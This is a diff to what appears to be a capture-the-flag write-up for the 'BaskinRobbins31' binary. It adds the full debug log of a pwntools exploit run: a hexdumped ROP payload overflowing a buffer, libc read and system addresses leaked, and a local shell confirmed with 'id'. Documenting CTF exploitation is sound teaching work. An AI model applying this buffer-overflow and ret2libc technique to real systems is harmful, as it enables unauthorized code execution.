@@ -105,3 +105,93 @@ p.sendline('/bin/sh')
 p.sendline(p64(leak_system))
 p.interactive()
 ```
+
+```bash
+python exploit.py 
+[DEBUG] PLT 0x4006ac putchar
+[DEBUG] PLT 0x4006c0 puts
+[DEBUG] PLT 0x4006d0 write
+[DEBUG] PLT 0x4006e0 printf
+[DEBUG] PLT 0x4006f0 memset
+[DEBUG] PLT 0x400700 read
+[DEBUG] PLT 0x400710 __libc_start_main
+[DEBUG] PLT 0x400720 srand
+[DEBUG] PLT 0x400730 time
+[DEBUG] PLT 0x400740 setvbuf
+[DEBUG] PLT 0x400750 strtoul
+[DEBUG] PLT 0x400760 sleep
+[DEBUG] PLT 0x400770 __gmon_start__
+[*] '/home/ubuntu/Desktop/Write-ups/BaskinRobbins31/BaskinRobbins31'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+[DEBUG] PLT 0x1f7f0 realloc
+[DEBUG] PLT 0x1f800 __tls_get_addr
+[DEBUG] PLT 0x1f820 memalign
+[DEBUG] PLT 0x1f850 _dl_find_dso_for_object
+[DEBUG] PLT 0x1f870 calloc
+[DEBUG] PLT 0x1f8a0 malloc
+[DEBUG] PLT 0x1f8a8 free
+[*] '/lib/x86_64-linux-gnu/libc.so.6'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[+] Starting local process './BaskinRobbins31': pid 974
+[DEBUG] Received 0xaa bytes:
+    '### This game is similar to the BaskinRobins31 game. ###\n'
+    '### The one that take the last match win ###\n'
+    'There are 31 number(s)\n'
+    'How many numbers do you want to take ? (1-3)\n'
+[DEBUG] Sent 0x159 bytes:
+    00000000  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│
+    *
+    000000b0  62 62 62 62  62 62 62 62  7a 08 40 00  00 00 00 00  │bbbb│bbbb│z·@·│····│
+    000000c0  01 00 00 00  00 00 00 00  40 20 60 00  00 00 00 00  │····│····│@ `·│····│
+    000000d0  08 00 00 00  00 00 00 00  d0 06 40 00  00 00 00 00  │····│····│··@·│····│
+    000000e0  7a 08 40 00  00 00 00 00  00 00 00 00  00 00 00 00  │z·@·│····│····│····│
+    000000f0  90 20 60 00  00 00 00 00  08 00 00 00  00 00 00 00  │· `·│····│····│····│
+    00000100  00 07 40 00  00 00 00 00  7a 08 40 00  00 00 00 00  │··@·│····│z·@·│····│
+    00000110  00 00 00 00  00 00 00 00  28 20 60 00  00 00 00 00  │····│····│( `·│····│
+    00000120  08 00 00 00  00 00 00 00  00 07 40 00  00 00 00 00  │····│····│··@·│····│
+    00000130  7a 08 40 00  00 00 00 00  90 20 60 00  00 00 00 00  │z·@·│····│· `·│····│
+    00000140  62 62 62 62  62 62 62 62  63 63 63 63  63 63 63 63  │bbbb│bbbb│cccc│cccc│
+    00000150  d0 06 40 00  00 00 00 00  0a                        │··@·│····│·│
+    00000159
+[DEBUG] Received 0x17e bytes:
+    00000000  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│
+    *
+    000000a0  59 01 00 00  00 00 00 00  61 61 61 61  61 61 61 61  │Y···│····│aaaa│aaaa│
+    000000b0  62 62 62 62  62 62 62 62  7a 08 40 00  00 00 00 00  │bbbb│bbbb│z·@·│····│
+    000000c0  01 00 00 00  00 00 00 00  40 20 60 00  00 00 00 00  │····│····│@ `·│····│
+    000000d0  08 00 00 00  00 00 00 00  d0 06 40 00  00 00 00 00  │····│····│··@·│····│
+    000000e0  7a 08 40 00  00 00 00 00  00 00 00 00  00 00 00 00  │z·@·│····│····│····│
+    000000f0  90 20 60 00  00 00 00 00  08 00 00 00  00 00 00 00  │· `·│····│····│····│
+    00000100  00 07 40 00  00 00 00 00  7a 08 40 00  00 00 00 00  │··@·│····│z·@·│····│
+    00000110  00 00 00 00  00 00 00 00  28 20 60 00  00 00 00 00  │····│····│( `·│····│
+    00000120  08 00 00 00  00 00 00 00  00 07 40 00  00 00 00 00  │····│····│··@·│····│
+    00000130  7a 08 40 00  00 00 00 00  90 20 60 00  00 00 00 00  │z·@·│····│· `·│····│
+    00000140  62 62 62 62  62 62 62 62  63 63 63 63  63 63 63 63  │bbbb│bbbb│cccc│cccc│
+    00000150  d0 06 40 00  00 00 00 00  0a 0a 44 6f  6e 27 74 20  │··@·│····│··Do│n't │
+    00000160  62 72 65 61  6b 20 74 68  65 20 72 75  6c 65 73 2e  │brea│k th│e ru│les.│
+    00000170  2e 2e 3a 28  20 0a 50 42  5f aa 54 7f  00 00        │..:(│ ·PB│_·T·│··│
+    0000017e
+[*] leaked read: 0x7f54aa5f4250
+[*] leaked system: 0x7f54aa542390
+[DEBUG] Sent 0x8 bytes:
+    '/bin/sh\n'
+[DEBUG] Sent 0x9 bytes:
+    00000000  90 23 54 aa  54 7f 00 00  0a                        │·#T·│T···│·│
+    00000009
+[*] Switching to interactive mode
+$ id
+[DEBUG] Sent 0x3 bytes:
+    'id\n'
+[DEBUG] Received 0x81 bytes:
+    'uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)\n'
+uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
+$  
+```
